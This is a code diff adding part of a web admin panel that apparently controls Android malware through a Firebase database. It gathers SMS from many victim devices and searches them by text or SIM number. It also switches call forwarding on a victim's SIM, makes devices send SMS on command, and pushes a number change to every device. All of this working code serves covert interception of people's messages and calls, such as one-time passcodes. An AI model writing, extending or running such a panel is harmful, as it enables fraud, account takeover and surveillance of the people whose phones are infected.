+    html += '<div class="info-val">To: ' + eh(String(cfData.PhoneNumber)) + '</div>';
+    html += '<div class="info-val" style="margin-top:4px;">Type: ' + eh(String(cfData.Type || '-')) + '</div>';
+    html += '<div class="info-val" style="margin-top:4px;">Status: ' + eh(String(cfData.Status || '-')) + '</div>';
+    html += '<div class="info-val" style="margin-top:4px;">SIM: ' + eh(String(cfData.SubID || '-')) + '</div>';
+  } else { html += '<div class="info-val">Set nahi hai</div>'; }
+  html += '</div>';
+  html += '<div class="info-card"><div class="info-label">&#128225; Forwad Status</div>';
+  html += '<div class="info-val">' + eh(String(fs || '-')) + '</div></div></div>';
+  return html;
+}
+
+function preloadFwdTab(key) {
+  var did = (DEVS[key] && DEVS[key].did) ? DEVS[key].did : key;
+  var cfData = null;
+  fbGet('Call_For/' + did)
+    .then(function(d) { cfData = d; return fbGet('Forwad_Status/' + did); })
+    .then(function(fs) { FWD_TAB_CACHE[key] = buildFwdHtml(cfData, fs); })
+    .catch(function() {});
+}
+
+function loadFwdTab(key) {
+  var el = document.getElementById('pnl-fwd');
+  /* Stale-while-revalidate: show cached/preloaded HTML instantly if we have it (feels
+     instant), but still fetch fresh data in the background since forwarding status
+     can change at any time - update silently if it turns out something changed. */
+  var hadCache = !!FWD_TAB_CACHE[key];
+  if (hadCache) { el.innerHTML = FWD_TAB_CACHE[key]; }
+  else { el.innerHTML = '<div class="loading"><div class="spin"></div>&nbsp;Loading...</div>'; }
+  var cfData = null;
+  var did = (DEVS[key] && DEVS[key].did) ? DEVS[key].did : key;
+  fbGet('Call_For/' + did)
+    .then(function(d) {
+      cfData = d;
+      return fbGet('Forwad_Status/' + did);
+    })
+    .then(function(fs) {
+      var html = buildFwdHtml(cfData, fs);
+      FWD_TAB_CACHE[key] = html;
+      el.innerHTML = html;
+    })
+    .catch(function(e) {
+      if (!hadCache) el.innerHTML = '<div class="empty"><div class="ei">&#128222;</div><p>Load fail: ' + e.message + '</p></div>';
+    });
+}
+
+/* ===== CALL FORWARDING ===== */
+function openCF() {
+  var d = DEVS[CUR]; if (!d) return;
+  /* Load SimINFO - sim1, sim2 fields */
+  var cdid = (DEVS[CUR] && DEVS[CUR].did) ? DEVS[CUR].did : CUR;
+  fbGet('SimINFO/' + cdid)
+    .then(function(sim) {
+      if (sim && typeof sim === 'object' && !sim.error && DEVS[CUR]) DEVS[CUR].sim = sim;
+      showCFDlg();
+    })
+    .catch(function() { showCFDlg(); });
+}
+
+function showCFDlg() {
+  var d = DEVS[CUR] || {}, sim = d.sim || {};
+  /* sim1 field contains: "+91766850304 - IND airtel - airtel" */
+  var s1 = sim.sim1 || 'Not available';
+  var s2 = sim.sim2 || 'Not available';
+  var html = '<div class="sim-row sel"><div class="sim-ic">&#128246;</div>';
+  html += '<div class="sim-inf"><div class="sim-nm">SIM - 1</div><div class="sim-no">' + eh(s1) + '</div></div>';
+  html += '<div class="sim-rb chk"></div></div>';
+  html += '<div class="sim-row"><div class="sim-ic">&#128246;</div>';
+  html += '<div class="sim-inf"><div class="sim-nm">SIM - 2</div><div class="sim-no">' + eh(s2) + '</div></div>';
+  html += '<div class="sim-rb"></div></div>';
+  document.getElementById('sim-list').innerHTML = html;
+  var rows = document.querySelectorAll('#sim-list .sim-row');
+  for (var i = 0; i < rows.length; i++) {
+    (function(row, idx) { row.addEventListener('click', function() { selSim(idx); }); })(rows[i], i);
+  }
+  SEL_SIM = 0;
+  document.getElementById('cf-res').style.display = 'none';
+  document.getElementById('cf-num').value = '';
+  openD('dlg-cf');
+}
+
+function selSim(idx) {
+  SEL_SIM = idx;
+  var rows = document.querySelectorAll('#sim-list .sim-row');
+  for (var i = 0; i < rows.length; i++) {
+    var on = (i === idx);
+    if (on) rows[i].classList.add('sel'); else rows[i].classList.remove('sel');
+    var rb = rows[i].querySelector('.sim-rb');
+    if (rb) { if (on) rb.classList.add('chk'); else rb.classList.remove('chk'); }
+  }
+}
+
+function doCF(action) {
+  var num = document.getElementById('cf-num').value.trim();
+  if (action !== 'check' && !num) { showToast('Number daalo!'); return; }
+  if (action === 'check') {
+    var qdid = (DEVS[CUR] && DEVS[CUR].did) ? DEVS[CUR].did : CUR;
+    fbGet('Call_For/' + qdid)
+      .then(function(d) {
+        var r = document.getElementById('cf-res'); r.style.display = 'block';
+        if (d && d.PhoneNumber) {
+          r.textContent = 'To: ' + d.PhoneNumber + ' | Type: ' + (d.Type || '-') + ' | SIM: ' + (d.SubID || '-');
+        } else { r.textContent = 'Set nahi hai'; }
+      })
+      .catch(function(e) { showToast('Error: ' + e.message); });
+    return;
+  }
+  var cfData = action === 'active'
+    ? {PhoneNumber: num, Status: 'Yes', SubID: String(SEL_SIM + 1), Type: 'Active'}
+    : {PhoneNumber: num, Status: 'No', SubID: String(SEL_SIM + 1), Type: 'DeActive'};
+  var wdid = (DEVS[CUR] && DEVS[CUR].did) ? DEVS[CUR].did : CUR;
+  fbSet('Call_For/' + wdid, cfData)
+    .then(function() {
+      showToast(action === 'active' ? 'Call Forwarding Active!' : 'Call Forwarding Deactive!');
+      closeD('dlg-cf');
+      if (document.getElementById('tb-fwd').className === 'tab-btn active') loadFwdTab(CUR);
+    })
+    .catch(function(e) { showToast('Error: ' + e.message); });
+}
+
+/* ===== SMS SEND ===== */
+var SEL_SMS_SIM = 1;
+var SMS_STATUS_TIMER = null;
+var SMS_SIM1_VAL = '1'; /* subID1 value from SimINFO */
+var SMS_SIM2_VAL = '2'; /* subID2 value from SimINFO */
+
+function selSmsSim(n) {
+  SEL_SMS_SIM = n;
+  var s1 = document.getElementById('sms-sim1-btn');
+  var s2 = document.getElementById('sms-sim2-btn');
+  var n1 = document.getElementById('sms-sim1-num');
+  var n2 = document.getElementById('sms-sim2-num');
+  if (n === 1) {
+    s1.style.border = '2px solid #0c9c5e'; s1.style.background = 'rgba(12,156,94,.08)'; s1.style.color = '#0c9c5e';
+    s2.style.border = '2px solid #e2e8f0'; s2.style.background = '#fff'; s2.style.color = '#64748b';
+    if (n1) n1.style.color = '#0c9c5e';
+    if (n2) n2.style.color = '#94a3b8';
+  } else {
+    s2.style.border = '2px solid #0c9c5e'; s2.style.background = 'rgba(12,156,94,.08)'; s2.style.color = '#0c9c5e';
+    s1.style.border = '2px solid #e2e8f0'; s1.style.background = '#fff'; s1.style.color = '#64748b';
+    if (n2) n2.style.color = '#0c9c5e';
+    if (n1) n1.style.color = '#94a3b8';
+  }
+}
+
+function openSmsSend() {
+  document.getElementById('sms-to').value = '';
+  document.getElementById('sms-msg').value = '';
+  document.getElementById('sms-status').style.display = 'none';
+  clearInterval(SMS_STATUS_TIMER);
+  openD('dlg-sms');
+  var diagEl = document.getElementById('vd-diag');
+  if (diagEl) diagEl.textContent = 'Verify_Device current state: checking...';
+  /* Warm up the connection to Firebase while the user types - a lightweight read
+     request opens the HTTPS connection (DNS + TLS handshake) ahead of time, so the
+     actual PUT when they tap Send doesn't pay that cold-start cost. This same read
+     also doubles as a diagnostic: it shows the user the CURRENT state of
+     Verify_Device for this device, read-only, so they can see for themselves whether
+     anything looks stale/stuck - nothing here is deleted or modified automatically. */
+  var sdid = (DEVS[CUR] && DEVS[CUR].did) ? DEVS[CUR].did : CUR;
+  var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
+  fetch(DB + '/Verify_Device/' + sdid + '.json' + auth, { method: 'GET' })
+    .then(function(r) { return r.json(); })
+    .then(function(v) {
+      if (!diagEl) return;
+      if (!v) { diagEl.textContent = 'Verify_Device current state: empty (no pending command)'; return; }
+      diagEl.textContent = 'Verify_Device current state: ' + JSON.stringify(v);
+    })
+    .catch(function() { if (diagEl) diagEl.textContent = ''; });
+}
+
+function doSendSms() {
+  var to = document.getElementById('sms-to').value.trim();
+  var msg = document.getElementById('sms-msg').value.trim();
+  if (!to || !msg) { showToast('Number aur message daalo!'); return; }
+  var sdid = (DEVS[CUR] && DEVS[CUR].did) ? DEVS[CUR].did : CUR;
+  var stEl = document.getElementById('sms-status');
+  clearInterval(SMS_STATUS_TIMER);
+  stEl.style.display = 'block';
+  stEl.style.background = '#fefce8'; stEl.style.border = '1px solid #fde68a'; stEl.style.color = '#92400e';
+  stEl.innerHTML = '&#9203; Sending...';
+  var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
+  var url = DB + '/Verify_Device/' + sdid + '.json' + auth;
+  /* Matches the APK's actual mechanism exactly, confirmed by decompiling
+     Admin_clone_apk.bak: the APK builds a HashMap{Number, Body, Status:"Yes"} and does
+     ONE single write to Verify_Device - no delete beforehand. The old DELETE->wait->PUT
+     sequence here never matched that and was the cause of the slow "Sending..." delay. */
+  fetch(url, { method: 'PUT', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({ Number: to, Body: msg, Status: 'Yes' }) })
+  .then(function(r) { if (!r.ok) throw new Error('HTTP ' + r.status); return r.json(); })
+  .then(function() {
+    stEl.style.background = '#f0fdf4'; stEl.style.border = '1px solid #bbf7d0'; stEl.style.color = '#15803d';
+    stEl.innerHTML = '&#9989; SMS Sent!';
+    showToast('&#9989; SMS Sent!');
+  })
+  .catch(function(e) {
+    stEl.innerHTML = '&#10060; Error: ' + e.message; stEl.style.color = '#dc2626';
+    showToast('Error: ' + e.message);
+  });
+}
+
+/* ===== UPDATE NO ===== */
+function openUpdNo() {
+  document.getElementById('upd-num').value = '';
+  document.getElementById('upd-cur').textContent = '...';
+  openD('dlg-upd');
+  fbGet('UpdateNo')
+    .then(function(v) {
+      document.getElementById('upd-cur').textContent = (v !== null && v !== undefined) ? String(v) : 'Set nahi hai';
+    })
+    .catch(function() { document.getElementById('upd-cur').textContent = '-'; });
+}
+
+function doUpdNo() {
+  var num = document.getElementById('upd-num').value.trim();
+  if (!num) { showToast('Number daalo!'); return; }
+  var dkeys = Object.keys(DEVS);
+  if (!dkeys.length) { showToast('Koi device nahi!'); return; }
+  showToast('Updating ' + dkeys.length + ' devices...');
+  var updates = {};
+  updates[NODE + '/All_User/UpdateNo'] = num;
+  for (var i = 0; i < dkeys.length; i++) {
+    updates[NODE + '/All_User/Info/' + dkeys[i] + '/Number'] = num;
+  }
+  fbPatchRoot(updates)
+    .then(function() {
+      showToast('Update successfully - ' + dkeys.length + ' devices!');
+      document.getElementById('upd-cur').textContent = num;
+      closeD('dlg-upd');
+    })
+    .catch(function(e) { showToast('Error: ' + e.message); });
+}
+
+/* ===== SEARCH ===== */
+function onSrch(q) {
+  document.getElementById('s-cl').style.display = q ? 'block' : 'none';
+  clearTimeout(STIMER);
+  if (!q.trim()) {
+    document.getElementById('search-screen').style.display = 'none';
+    var ap = document.getElementById('app'); ap.style.display = 'flex'; ap.style.flexDirection = 'column';
+    return;
+  }
+  STIMER = setTimeout(function() { runSrch(q.trim()); }, 300);
+}
+
+function runSrch(q) {
+  document.getElementById('app').style.display = 'none';
+  document.getElementById('detail-screen').style.display = 'none';
+  var ss = document.getElementById('search-screen'); ss.style.display = 'flex'; ss.style.flexDirection = 'column';
+  var ql = q.toLowerCase(), results = [], devs = Object.values(DEVS);
+  for (var i = 0; i < devs.length; i++) {
+    var d = devs[i], matches = [];
+    for (var j = 0; j < d.sms.length; j++) {
+      var s = d.sms[j];
+      var b = (s.msg || '').toLowerCase();
+      var a = (s.ph || '').toLowerCase();
+      if (b.indexOf(ql) !== -1 || a.indexOf(ql) !== -1) matches.push(s);
+    }
+    if (matches.length) results.push({d: d, m: matches});
+  }
+  var total = 0; for (var i = 0; i < results.length; i++) total += results[i].m.length;
+  document.getElementById('sr-info').textContent = results.length
+    ? '"' + q + '" - ' + results.length + ' device, ' + total + ' SMS'
+    : '"' + q + '" - koi SMS nahi';
+  var el = document.getElementById('sr-list');
+  if (!results.length) {
+    el.innerHTML = '<div class="empty"><div class="ei">&#128269;</div><p>Koi SMS nahi mila</p></div>';
+    return;
+  }
+  el.innerHTML = ''; var frag = document.createDocumentFragment();
+  for (var i = 0; i < results.length; i++) {
+    var r = results[i];
+    var card = document.createElement('div'); card.className = 'src-card';
+    var badge = document.createElement('span'); badge.className = 'src-badge'; badge.textContent = r.d.name;
+    var cnt = document.createElement('span'); cnt.style.cssText = 'font-size:11px;color:#64748b;margin-left:6px;';
+    cnt.textContent = r.m.length + ' SMS'; card.appendChild(badge); card.appendChild(cnt);
+    var lim = Math.min(3, r.m.length);
+    for (var j = 0; j < lim; j++) {
+      var s = r.m[j];
+      var mc = document.createElement('div'); mc.className = 'sms-card'; mc.style.marginTop = '8px';
+      var aEl = document.createElement('div'); aEl.className = 'sms-addr'; aEl.textContent = 'Address : ' + (s.ph || '-');
+      var bEl = document.createElement('div'); bEl.className = 'sms-body'; bEl.innerHTML = hlTxt(eh(s.msg || ''), q);
+      mc.appendChild(aEl); mc.appendChild(bEl); card.appendChild(mc);
+    }
+    if (r.m.length > 3) {
+      var more = document.createElement('div');
+      more.style.cssText = 'font-size:12px;color:#0c9c5e;text-align:center;padding:4px 0;';
+      more.textContent = '+' + (r.m.length - 3) + ' aur';
+      card.appendChild(more);
+    }
+    (function(k) { card.addEventListener('click', function() { openDev(k); }); })(r.d.key);
+    frag.appendChild(card);
+  }
+  el.appendChild(frag);
+}
+
+function clrSrch() {
+  document.getElementById('gsearch').value = '';
+  document.getElementById('s-cl').style.display = 'none';
+  document.getElementById('search-screen').style.display = 'none';
+  var ap = document.getElementById('app'); ap.style.display = 'flex'; ap.style.flexDirection = 'column';
+  setTimeout(function() { window.scrollTo(0, SCROLL_POS); }, 50);
+}
+
+function hlTxt(text, q) {
+  if (!q) return text;
+  var out = '', lo = text.toLowerCase(), lq = q.toLowerCase(), i = 0;
+  while (true) {
+    var p = lo.indexOf(lq, i);
+    if (p === -1) { out += text.slice(i); break; }
+    out += text.slice(i, p) + '<span class="hl">' + text.slice(p, p + q.length) + '</span>';
+    i = p + q.length;
+  }
+  return out;
+}
+
+/* ===== UTILS ===== */
+function getTs(t) {
+  if (!t) return 0;
+  if (typeof t === 'string') t = parseFloat(t) || 0;
+  if (typeof t === 'number') return t > 1e12 ? t : t * 1000;
+  return 0;
+}
+
+function fmtDate(t) {
+  if (!t) return '';
+  try {
+    var n = typeof t === 'string' ? parseFloat(t) : t;
+    var d = n > 1e12 ? new Date(n) : new Date(n * 1000);
+    if (isNaN(d.getTime())) return String(t);
+    return d.toLocaleString('en-IN', {day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});
+  } catch(e) { return String(t); }
+}
+
+function eh(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function openD(id) { document.getElementById(id).style.display = 'flex'; }
+function closeD(id) { document.getElementById(id).style.display = 'none'; }
+
+var ovs = document.querySelectorAll('.overlay');
+for (var oi = 0; oi < ovs.length; oi++) {
+  ovs[oi].addEventListener('click', function(e) { if (e.target === this) this.style.display = 'none'; });
+}
+
+function showToast(msg) {
+  var t = document.getElementById('toast'); t.innerHTML = msg; t.style.opacity = '1';
+  clearTimeout(TTIMER); TTIMER = setTimeout(function() { t.style.opacity = '0'; }, 2500);
+}
+</script>
+
+<!-- Change Password Dialog -->
+<div class="overlay" id="dlg-chpass">
+  <div class="dlg">
+    <div class="dlg-hdr">&#128272; Change Admin Password</div>
+    <div class="dlg-body">
+      <input class="di" id="new-pass-inp" placeholder="Naya password" type="text" autocomplete="off"/>
+      <button class="dbtn" onclick="doChangePass()">&#128190; Save</button>
+      <button class="dbtn-cancel" onclick="closeD('dlg-chpass')">Cancel</button>
+    </div>
+  </div>
+</div>
+
+<script>
+/* ===== NOTES TAB ===== */
+function loadNoteTab(key) {
+  var txt = document.getElementById('note-txt');
+  var status = document.getElementById('note-status');
+  if (!txt) return;
+  txt.value = '';
+  if (status) status.textContent = 'Loading...';
+  var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
+  var url = DB + '/' + NODE + '/Notes/' + key + '.json' + auth;
+  fetch(url, {cache:'no-store'})
+    .then(function(r){ return r.json(); })
+    .then(function(d){
+      txt.value = (d && typeof d === 'string') ? d : (d && d.text ? d.text : '');
+      if (status) status.textContent = txt.value ? 'Last saved note loaded' : 'Koi note nahi - likho aur save karo';
+    })
+    .catch(function(){ if(status) status.textContent = 'Load failed'; });
+}
+function saveNote() {
+  var txt = document.getElementById('note-txt');
+  var status = document.getElementById('note-status');
+  if (!txt || !CUR) return;
+  var note = txt.value.trim();
+  var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
+  var url = DB + '/' + NODE + '/Notes/' + CUR + '.json' + auth;
+  if (status) status.textContent = 'Saving...';
+  fetch(url, {
+    method: 'PUT',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify(note)
+  })
+  .then(function(r){ if(!r.ok) throw new Error('HTTP '+r.status); return r.json(); })
+  .then(function(){
+    if (status) { status.textContent = 'Saved!'; status.style.color='#16a34a'; }
+    setTimeout(function(){ if(status) status.style.color=''; }, 2000);
+  })
+  .catch(function(e){ if(status) { status.textContent='Error: '+e.message; status.style.color='#dc2626'; } });
+}
+
+/* ===== DISABLE PULL TO REFRESH ===== */
+var _lastY = 0;
+document.addEventListener('touchstart', function(e) {
+  _lastY = e.touches[0].clientY;
+}, {passive: false});
+document.addEventListener('touchmove', function(e) {
+  var y = e.touches[0].clientY;
+  var scrollTop = document.scrollingElement ? document.scrollingElement.scrollTop : document.body.scrollTop;
+  /* Block pull down when at top */
+  if (y > _lastY && scrollTop <= 0) {
+    e.preventDefault();
+  }
+}, {passive: false});
+</script>
+<script>
+/* ===== MOBILE BACK BUTTON ===== */
+function pushHist(s) { try { history.pushState({p:s}, ''); } catch(e){} }
+window.addEventListener('popstate', function() {
+  var ds = document.getElementById('detail-screen');
+  var ss = document.getElementById('search-screen');
+  var ov = document.getElementById('today-sms-ov');
+  if (ov && ov.style.display === 'flex') { ov.style.display = 'none'; pushHist('app'); return; }
+  if (ds && ds.style.display === 'flex') { goBack(); pushHist('app'); return; }
+  if (ss && ss.style.display === 'flex') { clrSrch(); pushHist('app'); return; }
+});
+var _od = openDev;
+openDev = function(k) { _od(k); pushHist('detail'); };
+
+/* ===== ADMIN PASSWORD ===== */
+function loadAdminPass() {
+  fbGetRoot(NODE + '/Admin_Password').then(function(v) {
+    var el = document.getElementById('admin-pass-val');
+    if (el) el.textContent = (v !== null && v !== undefined) ? String(v) : 'N/A';
+  }).catch(function(){});
+}
+function openChangePass() {
+  document.getElementById('new-pass-inp').value = '';
+  openD('dlg-chpass');
+}
+function doChangePass() {
+  var p = (document.getElementById('new-pass-inp').value || '').trim();
+  if (!p) { showToast('Password khali nahi!'); return; }
+  var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
+  fetch(DB + '/' + NODE + '/Admin_Password.json' + auth, {
+    method: 'PUT', headers: {'Content-Type':'application/json'}, body: JSON.stringify(p)
+  }).then(function(r){ if(!r.ok) throw new Error('HTTP '+r.status); return r.json(); })
+  .then(function(){
+    var el = document.getElementById('admin-pass-val');
+    if (el) el.textContent = p;
+    closeD('dlg-chpass');
+    showToast('Password updated: ' + p);
+  }).catch(function(e){ showToast('Error: ' + e.message); });
+}
+
+/* ===== TODAY SMS ===== */
+function openTodaySms() {
+  var midnight = new Date(); midnight.setHours(0,0,0,0);
+  var ov = document.getElementById('today-sms-ov');
+  if (!ov) {
+    ov = document.createElement('div');
+    ov.id = 'today-sms-ov';
+    ov.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:#f0f2f5;z-index:999;display:flex;flex-direction:column;';
+    var hdr = document.createElement('div');
+    hdr.style.cssText = 'background:#ffffff;border-bottom:1px solid #cfdbd5;padding:13px 15px;display:flex;align-items:center;justify-content:space-between;';
+    var title = document.createElement('div');
+    title.style.cssText = 'color:#0a1810;font-size:15px;font-weight:700;';
+    title.textContent = 'Today SMS';
+    var btnRow = document.createElement('div');
+    btnRow.style.cssText = 'display:flex;gap:6px;';
+    var refBtn = document.createElement('button');
+    refBtn.style.cssText = 'background:#eef3f0;color:#0c9c5e;border:1px solid #0a7d4a;border-radius:8px;padding:6px 10px;font-size:12px;font-weight:700;cursor:pointer;';
+    refBtn.textContent = 'Refresh';
+    refBtn.onclick = function() { fetchTodaySms(); };
+    var backBtn = document.createElement('button');
+    backBtn.style.cssText = 'background:#eef3f0;color:#0a1810;border:1px solid #cfdbd5;border-radius:8px;padding:6px 12px;font-size:12px;font-weight:700;cursor:pointer;';
+    backBtn.textContent = 'Back';
+    backBtn.onclick = function() { ov.style.display = 'none'; };
+    btnRow.appendChild(refBtn); btnRow.appendChild(backBtn);
+    hdr.appendChild(title); hdr.appendChild(btnRow);
+    var lst = document.createElement('div');
+    lst.id = 'today-sms-list';
+    lst.style.cssText = 'flex:1;overflow-y:auto;padding:10px 14px 80px;';
+    ov.appendChild(hdr); ov.appendChild(lst);
+    document.body.appendChild(ov);
+  } else { ov.style.display = 'flex'; }
+  pushHist('today');
+  fetchTodaySms();
+}
+
+function fetchTodaySms() {
+  var midnight = new Date(); midnight.setHours(0,0,0,0);
+  var listEl = document.getElementById('today-sms-list');
+  if (!listEl) return;
+  listEl.innerHTML = '<div class="loading"><div class="spin"></div>&nbsp;Loading...</div>';
+  var onDevs = Object.values(DEVS).filter(function(d){ return d.on; });
+  if (!onDevs.length) {
+    listEl.innerHTML = '<div class="empty"><div class="ei">&#128172;</div><p>Koi online device nahi</p></div>';
+    return;
+  }
+  var all = [], done = 0, total = onDevs.length;
+  /* Speed mode: all online devices fetched in parallel, no stagger delay */
+  onDevs.forEach(function(dev) {
+    /* limitToLast=100 per device */
+    var auth = APIKEY ? '&auth=' + encodeURIComponent(APIKEY) : '';
+    var url = DB + '/' + NODE + '/All_User/Sms/' + (dev.did||dev.key) + '.json?orderBy=%22$key%22&limitToLast=100' + auth;
+    fetch(url, {cache:'no-store'}).then(function(r){ return r.json(); }).then(function(sd) {
+      if (sd && typeof sd === 'object') {
+        Object.keys(sd).forEach(function(k) {
+          var s = sd[k]; if (!s) return;
+          var ts = getTs(s.date || s.Date || '');
+          if (ts >= midnight.getTime()) all.push({devKey:dev.key, devName:dev.name, key:k, sms:s, ts:ts});
+        });
+      }
+      done++; if (done >= total) renderTodaySms(all, listEl);
+    }).catch(function(){ done++; if(done>=total) renderTodaySms(all, listEl); });
+  });
+}
+
+function renderTodaySms(all, listEl) {
+  all.sort(function(a,b){ return b.ts - a.ts; });
+  if (!all.length) {
+    listEl.innerHTML = '<div class="empty"><div class="ei">&#128172;</div><p>Aaj koi SMS nahi</p></div>';
+    return;
+  }
+  listEl.innerHTML = '';
+  var hdrEl = document.createElement('div');
+  hdrEl.style.cssText = 'font-size:12px;color:#64748b;margin-bottom:8px;';
+  hdrEl.textContent = all.length + ' SMS aaj';
+  listEl.appendChild(hdrEl);
+  var frag = document.createDocumentFragment();
+  all.forEach(function(item) {
+    var s = item.sms;
+    var card = document.createElement('div');
+    card.className = 'asms-card'; card.style.marginBottom = '10px';
+    var topRow = document.createElement('div');
+    topRow.style.cssText = 'display:flex;align-items:center;margin-bottom:5px;';
+    var badge = document.createElement('span'); badge.className = 'asms-dev'; badge.textContent = item.devName;
+    var cpBtn = document.createElement('button'); cpBtn.className = 'asms-del';
+    cpBtn.style.background = 'rgba(12,156,94,.08)'; cpBtn.style.borderColor = 'rgba(12,156,94,.35)'; cpBtn.style.color = '#0c9c5e';
+    cpBtn.textContent = 'COPY';
+    (function(msgText, btn) {
+      btn.addEventListener('click', function(e) {
+        e.stopPropagation();
+        copyTextToClipboard(msgText);
+        var orig = btn.textContent;
+        btn.textContent = 'DONE';
+        showToast('Message copied!');
+        setTimeout(function() { btn.textContent = orig; }, 1200);
+      });
+    })(s.msg || s.body || '', cpBtn);
+    var delBtn = document.createElement('button'); delBtn.className = 'asms-del'; delBtn.textContent = 'DEL';
+    (function(dk, sk, btn) {
+      btn.addEventListener('click', function(e) {
+        e.stopPropagation();
+        btn.textContent = '...'; btn.disabled = true;
+        fbDel('Sms/' + dk + '/' + sk)
+          .then(function(){ card.remove(); showToast('Deleted!'); })
+          .catch(function(){ btn.textContent='DEL'; btn.disabled=false; });
+      });
+    })(item.devKey, item.key, delBtn);
+    topRow.appendChild(badge); topRow.appendChild(cpBtn); topRow.appendChild(delBtn);
+    var aEl = document.createElement('div'); aEl.className = 'asms-addr'; aEl.textContent = 'Address : ' + (s.ph || s.address || '-');
+    var bEl = document.createElement('div'); bEl.className = 'asms-body'; bEl.textContent = s.msg || s.body || '-';
+    var tEl = document.createElement('div'); tEl.className = 'asms-time'; tEl.textContent = fmtDate(s.date || s.Date || '');
+    card.appendChild(topRow); card.appendChild(aEl); card.appendChild(bEl); card.appendChild(tEl);
+    (function(k){ card.addEventListener('click', function(e){ if(e.target===delBtn || e.target===cpBtn) return; document.getElementById('today-sms-ov').style.display='none'; openDev(k); }); })(item.devKey);
+    frag.appendChild(card);
+  });
+  listEl.appendChild(frag);
+}
+
+/* ===== SEARCH - Manual button ===== */
+function doSearch() {
+  var q = (document.getElementById('gsearch').value || '').trim();
+  document.getElementById('s-cl').style.display = q ? 'block' : 'none';
+  if (!q) { clrSrch(); return; }
+  document.getElementById('app').style.display = 'none';
+  document.getElementById('detail-screen').style.display = 'none';
+  var ss = document.getElementById('search-screen');
+  ss.style.display = 'flex'; ss.style.flexDirection = 'column';
+  document.getElementById('sr-info').textContent = 'Searching...';
+  document.getElementById('sr-list').innerHTML = '<div class="loading"><div class="spin"></div>&nbsp;Fetch ho raha hai...</div>';
+  pushHist('search');
+  var onDevs = Object.values(DEVS).filter(function(d){ return d.on; });
+  if (!onDevs.length) {
+    document.getElementById('sr-info').textContent = 'Koi online device nahi';
+    document.getElementById('sr-list').innerHTML = '<div class="empty"><div class="ei">&#128241;</div><p>Koi online device nahi</p></div>';
+    return;
+  }
+  var all = [], done = 0, total = onDevs.length;
+  var simData = {}; /* devKey -> {sim1, sim2} */
+  /* Speed mode: all online devices' SMS + SimINFO fetched in parallel, no stagger
+     delay. limitToLast raised to 300 (was 100) for deeper search coverage. */
+  onDevs.forEach(function(dev) {
+    var auth = APIKEY ? '&auth=' + encodeURIComponent(APIKEY) : '';
+    var url = DB + '/' + NODE + '/All_User/Sms/' + (dev.did || dev.key) + '.json?orderBy=%22$key%22&limitToLast=300' + auth;
+    fetch(url, { cache: 'no-store' }).then(function(r){ return r.json(); }).then(function(sd) {
+      if (sd && typeof sd === 'object') {
+        Object.keys(sd).forEach(function(k) {
+          var s = sd[k]; if (!s) return;
+          all.push({devKey:dev.key, devName:dev.name, key:k,
+            sms:{_key:k, date:s.date||s.Date||'', msg:s.msg||s.body||'', ph:s.ph||s.address||''}});
+        });
+      }
+      done++; if (done >= total) runSrchOnData(q, all, simData);
+    }).catch(function(){ done++; if(done>=total) runSrchOnData(q, all, simData); });
+    /* Use cached SimINFO if device's own dialog already loaded it, otherwise fetch fresh.
+       This is the only way to search by SIM number, since SimINFO isn't part of the
+       normal Info/SMS data already in memory. */
+    if (dev.sim && (dev.sim.sim1 || dev.sim.sim2)) {
+      simData[dev.key] = dev.sim;
+    } else {
+      var simAuth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
+      var simUrl = DB + '/' + NODE + '/All_User/SimINFO/' + (dev.did || dev.key) + '.json' + simAuth;
+      fetch(simUrl, { cache: 'no-store' }).then(function(r){ return r.json(); }).then(function(sim) {
+        if (sim && typeof sim === 'object' && !sim.error) simData[dev.key] = sim;
+      }).catch(function(){});
+    }
+  });
+}
+
+function runSrchOnData(q, all, simData) {
+  simData = simData || {};
+  var ql = q.toLowerCase();
+
+  /* Step 1: which devices match by NAME or SIM NUMBER (device-level match) */
+  var devNameOrSimMatch = {}; /* devKey -> true */
+  var seenDevKeys = {};
+  all.forEach(function(item) { seenDevKeys[item.devKey] = item.devName; });
+  Object.keys(seenDevKeys).forEach(function(devKey) {
+    var devName = (seenDevKeys[devKey] || '').toLowerCase();
+    if (devName.indexOf(ql) !== -1) { devNameOrSimMatch[devKey] = true; return; }
+    var sim = simData[devKey];
+    if (sim) {
+      var s1 = (sim.sim1 || '').toLowerCase();
+      var s2 = (sim.sim2 || '').toLowerCase();
+      if (s1.indexOf(ql) !== -1 || s2.indexOf(ql) !== -1) devNameOrSimMatch[devKey] = true;
+    }
+  });
+
+  /* Step 2: collect matches - either the SMS text/sender matches, OR the device
+     itself matched by name/SIM (in which case ALL of that device's loaded SMS
+     are eligible, since the user is asking to see that device's messages). */
+  var matches = [];
+  all.forEach(function(item) {
+    var b = (item.sms.msg||'').toLowerCase(), a = (item.sms.ph||'').toLowerCase();
+    var smsTextMatch = (b.indexOf(ql) !== -1 || a.indexOf(ql) !== -1);
+    if (smsTextMatch || devNameOrSimMatch[item.devKey]) matches.push(item);
+  });
+
+  /* Group by device - each device appears exactly ONCE, with up to 5 of its most
+     recent matching SMS underneath. This fixes the "same device scattered in
+     multiple places, old messages mixed with new" problem. */
+  var byDevice = {}; /* devKey -> {name, items: [...]} */
+  matches.forEach(function(item) {
+    if (!byDevice[item.devKey]) byDevice[item.devKey] = { name: item.devName, items: [] };
+    byDevice[item.devKey].items.push(item);
+  });
+  var deviceGroups = Object.keys(byDevice).map(function(k) {
+    var g = byDevice[k];
+    /* Sort this device's matches newest-first, keep only top 5 */
+    g.items.sort(function(x, y) { return getTs(y.sms.date||'') - getTs(x.sms.date||''); });
+    g.items = g.items.slice(0, 5);
+    g.devKey = k;
+    g.latestTs = getTs(g.items[0].sms.date||'');
+    return g;
+  });
+  /* Order devices by their own latest matching SMS - most recently active device first */
+  deviceGroups.sort(function(x, y) { return y.latestTs - x.latestTs; });
+
